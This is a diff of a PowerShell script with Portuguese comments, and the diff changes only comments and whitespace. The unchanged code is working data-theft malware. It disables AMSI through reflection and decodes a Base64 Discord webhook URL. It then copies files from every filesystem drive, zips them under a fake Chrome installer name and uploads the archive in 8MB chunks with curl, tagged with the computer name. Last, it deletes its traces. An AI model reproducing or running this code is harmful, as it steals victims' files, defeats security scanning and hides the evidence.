@@ -1,9 +1,9 @@
-# [Bypass AMSI Ofuscado] - Fragmentação de strings para evitar assinatura em memória
+# [Bypass AMSI] - Fragmentação para evitar deteção em memória
 $b = "System.Management.Automation.Amsi" + "Utils"; 
 $c = [Ref].Assembly.GetType($b); 
 $c.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
 
-# 1. Configurações e Password (Manso2026!)
+# 1. Configurações (Webhook em Base64 e Password Manso2026!)
 $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
 $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))
 
@@ -23,7 +23,7 @@ Get-PSDrive -PSProvider FileSystem | ForEach-Object {
     } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
 }
 
-# 3. Compactação e Fragmentação com Delay (8MB por parte)
+# 3. Compactação e Fragmentação (8MB por parte com Delay de 5s)
 $zipFile = "$env:TEMP\chrome_installer_exe.tmp"
 if ((Get-ChildItem $tempDir).Count -gt 0) {
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
@@ -37,10 +37,10 @@ if ((Get-ChildItem $tempDir).Count -gt 0) {
         curl.exe -k -s -F "file=@$pPath" -F "content=Parte $part - $env:COMPUTERNAME" $u
         Remove-Item $pPath
         $part++
-        Start-Sleep -Seconds 5 # Intervalo para evitar Rate Limiting
+        Start-Sleep -Seconds 5 
     }
     $fileStream.Close()
 }
 
-# 4. Limpeza de Rastos
+# 4. Limpeza de Rastos e Auto-Destruição
 Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
